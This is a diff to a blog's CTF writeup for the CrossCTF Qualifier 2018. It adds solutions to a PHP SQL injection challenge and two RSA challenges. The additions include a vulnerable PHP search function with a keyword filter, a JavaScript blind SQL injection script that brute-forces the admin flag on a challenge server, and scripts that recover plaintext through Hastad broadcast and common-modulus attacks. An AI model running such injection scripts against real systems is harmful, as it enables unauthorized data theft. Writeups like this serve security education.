@@ -8,7 +8,7 @@
 		<meta name="author" content="Alan Chang">
 		<meta name="description" content="a random blog about cybersecurity and programming">
 		<meta name="generator" content="Hugo 0.40.3" />
-		<title>Crossctf 2018 Writeup &middot; Alan&#39;s Blog</title>
+		<title>Crossctf Qualifier 2018 Writeup &middot; Alan&#39;s Blog</title>
 		<link rel="shortcut icon" href="https://tcode2k16.github.io/blog/images/favicon.ico">
 		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/style.css">
 		<link rel="stylesheet" href="https://tcode2k16.github.io/blog/css/highlight.css">
@@ -46,12 +46,12 @@
             <article>
                 <header>
                     <h1>
-                        Crossctf 2018 Writeup
+                        Crossctf Qualifier 2018 Writeup
                     </h1>
                     <h2 class="headline">
                     May 19, 2018 13:05
-                    · 409 words
-                    · 2 minute read
+                    · 1058 words
+                    · 5 minute read
                       <span class="tags">
                       
                       
@@ -97,6 +97,21 @@
 <li><a href="#problem-4">Problem</a></li>
 <li><a href="#solution-4">Solution</a></li>
 </ul></li>
+<li><a href="#baby-web">Baby Web</a>
+<ul>
+<li><a href="#problem-5">Problem</a></li>
+<li><a href="#solution-5">Solution</a></li>
+</ul></li>
+<li><a href="#babyrsa">BabyRSA</a>
+<ul>
+<li><a href="#problem-6">Problem</a></li>
+<li><a href="#solution-6">Solution</a></li>
+</ul></li>
+<li><a href="#babyrsa-2">BabyRSA 2</a>
+<ul>
+<li><a href="#problem-7">Problem</a></li>
+<li><a href="#solution-7">Solution</a></li>
+</ul></li>
 </ul>
 </nav>
                     </div>
@@ -132,7 +147,7 @@ app.listen(31337)
 
 <p>Also, the code used <code>==</code> instead of <code>===</code>; therefore, values of different types can be equal to each other and types are converted according to <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness">this</a>:</p>
 
-<p><img src="/blog/images/crossctf-2018-writeup/equal-table.png" alt="equal table" /></p>
+<p><img src="/blog/crossctf-2018-writeup/equal-table.png" alt="equal table" /></p>
 
 <p>So, when <code>req.query.first = ['','','','','','','','']</code>, it has a length of <code>8</code> and equals to string <code>',,,,,,,'</code>.</p>
 
@@ -267,6 +282,207 @@ false
 <p>Final payload: <code>http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&amp;six=I_AM_ELEET_HAX0R</code></p>
 
 <p>Flag: <code>CrossCTF{1_am_n1k0las_ray_zhizihizhao}</code></p>
+
+<h1 id="baby-web">Baby Web</h1>
+
+<h2 id="problem-5">Problem</h2>
+
+<pre><code class="language-php">...
+function getAllUsernameLike($username) {
+    $dbhost = 'localhost';
+    $dbuser = 'crossctf';
+    $dbpass = 'CROSSCTFP@SSW0RDV3RYL0NGANDG00DANDVERYLONG';
+    $dbname = 'crossctf';
+    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname) or die(&quot;Wrong info given&quot;);
+    if ($conn-&gt;connect_error) {
+        exit();
+    }
+    $return = array();
+
+    $username = str_replace(&quot; &quot;,&quot;&quot;, $username);
+    $array = array(&quot;=&quot;, &quot;union&quot;, &quot;join&quot;, &quot;select&quot;, &quot;or&quot;, &quot;from&quot;, &quot;insert&quot;, &quot;delete&quot;);
+    if(0 &lt; count(array_intersect(array_map('strtolower', explode(' ', $username)), $array)))
+    {
+        die(&quot;die hacker!&quot;);
+    }
+    $sql = &quot;SELECT username FROM users WHERE username like '%$username%';&quot;;
+    $result = $conn-&gt;query($sql);
+    while ($row = $result-&gt;fetch_array()) {
+        array_push($return, $row);
+    }
+    $conn-&gt;close();
+    if ( empty($return) ) {
+        return null;
+    } else {
+        return $return;
+    }
+}
+if (isset($_GET['search']) &amp;&amp; isset($_POST['username'])) {
+    $users = getAllUsernameLike($_POST['username']);
+}
+...
+</code></pre>
+
+<p>Notes: <code>The flag is in the flag column of the user 'admin'.</code></p>
+
+<h2 id="solution-5">Solution</h2>
+
+<pre><code class="language-javascript">const request = require('request-promise');
+
+let flag = '';
+let str = 'abcdefghijklmnopqrstuvwxyz!{}ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_';
+
+(async function () {
+  while (true) {
+    for (let i = 0; i &lt; str.length; i++) {
+      let char = str[i]
+      let query = &quot;admin%'	and	users.flag	like	binary	'&quot;+flag+char;
+      let options = {
+        method: 'POST',
+        uri: 'http://ctf.pwn.sg:8180/?search',
+        form: {
+            username: query
+        }
+      };
+      let body = await request(options);
+      if (body.indexOf('&lt;tr&gt;&lt;td&gt;admin&lt;/td&gt;&lt;/tr&gt;') &gt;= 0) {
+        flag += char;
+        console.log('got one: ' + query);
+        break;
+      } else {
+        console.log('tried: ' + query);
+      }
+    }
+  }
+})();
+</code></pre>
+
+<p>Notes:</p>
+
+<ul>
+<li>use tabs over spaces</li>
+<li>use <code>like binary</code> to find the casing</li>
+</ul>
+
+<p>Flag: <code>CrossCTF{SiMpLe_sQl_iNjEcTiOn_aS_WaRmUp}</code></p>
+
+<h1 id="babyrsa">BabyRSA</h1>
+
+<h2 id="problem-6">Problem</h2>
+
+<p>Each time I asked for the flag, it gets encoded through RSA. I&rsquo;m lucky I kept all those values.</p>
+
+<p><a href="/blog/crossctf-2018-writeup/BabyRSA/out.txt">out.txt</a></p>
+
+<h2 id="solution-6">Solution</h2>
+
+<p>For this challenge, the n values are different and the e values are all the same. This means that we can use the <a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese Remainder Theorem</a> as described <a href="https://www.linkedin.com/pulse/eve-magician-goes-china-crack-rsa-william-buchanan">here</a>.</p>
+
+<p>Using the CRT, you will be able to find <code>m^e</code> which is <code>m^257</code>. Then, I used a simple binary search to find the message which is between <code>10^252</code> and <code>10^253</code>.</p>
+
+<p>Code:</p>
+
+<pre><code class="language-javascript">const crt_bignum = require('nodejs-chinese-remainder');
+const bignum = require('bignum');
+const fs = require('fs');
+const bigInt = require(&quot;big-integer&quot;);
+
+const file = fs.readFileSync('./out.txt', 'utf8').split('\n');
+const ns = file.filter(e =&gt; e.indexOf('n =') &gt;= 0).map(e =&gt; bignum(e.substring(4)));
+const cs = file.filter(e =&gt; e.indexOf('c =') &gt;= 0).map(e =&gt; bignum(e.substring(4)));
+
+const result = crt_bignum(cs, ns);
+const answer = bigInt(result.toString());
+
+let lower = bigInt(10).pow(252);
+let upper = bigInt(10).pow(253);
+
+let target = null;
+let v = null;
+
+while (lower.lesser(upper)) {
+  target = lower.add(upper).divide(2);
+  console.log(target.toString());
+  v = target.pow(257);
+  if (v.eq(answer)) {
+    console.log(target.toString(16));
+    break;
+  } else if (v.lt(answer)) {
+    lower = target;
+    console.log('less');
+  } else {
+    upper = target;
+    console.log('more');
+  }
+}
+</code></pre>
+
+<p>Flag: <code>crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}</code></p>
+
+<h1 id="babyrsa-2">BabyRSA 2</h1>
+
+<h2 id="problem-7">Problem</h2>
+
+<p>Each time I asked for the flag, it gets encoded through RSA&hellip;. again&hellip; I&rsquo;m lucky I kept all those values&hellip; AGAIN!</p>
+
+<p><a href="/blog/crossctf-2018-writeup/BabyRSA2/out.txt">out.txt</a></p>
+
+<h2 id="solution-7">Solution</h2>
+
+<p>This question is the opposite of last one. The n values are the same while the e values are changing. One can use four rounds of the <a href="https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm">Extended Euclidean algorithm</a> to found <code>m^(gcd(e1, e2, e3, e4, e5) = 1)</code> which is the flag. The simplified process is described <a href="https://crypto.stackexchange.com/questions/1614/rsa-cracking-the-same-message-is-sent-to-two-different-people-problem">here</a>.</p>
+
+<p>Proof on a piece of paper:</p>
+
+<p><img src="/blog/crossctf-2018-writeup/BabyRSA2/proof.jpg" alt="proof" /></p>
+
+<p>Code:</p>
+
+<pre><code class="language-javascript">const bigInt = require(&quot;big-integer&quot;);
+const fs = require('fs');
+
+const ns = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e =&gt; e.indexOf('n =') &gt;= 0).map(e =&gt; e.substring(4));
+const es = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e =&gt; e.indexOf('e =') &gt;= 0).map(e =&gt; parseInt(e.substring(4)));
+const cs = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e =&gt; e.indexOf('c =') &gt;= 0).map(e =&gt; bigInt(e.substring(4)));
+const n = bigInt(ns[0]);
+
+// ref: http://pages.pacificcoast.net/~cazelais/euclid.html
+function xgcd(a,b) { 
+  if (b == 0) {
+    return [1, 0, a];
+  } else {
+   temp = xgcd(b, a % b);
+   x = temp[0];
+   y = temp[1];
+   d = temp[2];
+   return [y, x-y*Math.floor(a/b), d];
+  }
+}
+
+function modT(big, a) {
+  if (a &gt;= 0) {
+    return big.modPow(a, n);
+  } else {
+    return big.modInv(n).modPow(-a, n);
+  }
+}
+
+let r1 = xgcd(es[0], es[1]);
+console.log(r1);
+let r2 = xgcd(es[2], es[3]);
+console.log(r2);
+let r3 = xgcd(r1[2], r2[2]);
+console.log(r3);
+let r4 = xgcd(r3[2], es[4]);
+console.log(r4);
+
+let v1 = modT(cs[0], r1[0]).times(modT(cs[1], r1[1])).mod(n);
+let v2 = modT(cs[2], r2[0]).times(modT(cs[3], r2[1])).mod(n);
+let v3 = modT(v1, r3[0]).times(modT(v2, r3[1])).mod(n);
+let v4 = modT(v3, r4[0]).times(modT(cs[4], r4[1])).mod(n);
+console.log(v4.toString(16));
+</code></pre>
+
+<p>Flag: <code>crossctf{RSA_Challenges_Are_Too_Easy}</code></p>
 
                 </section>
             </article>
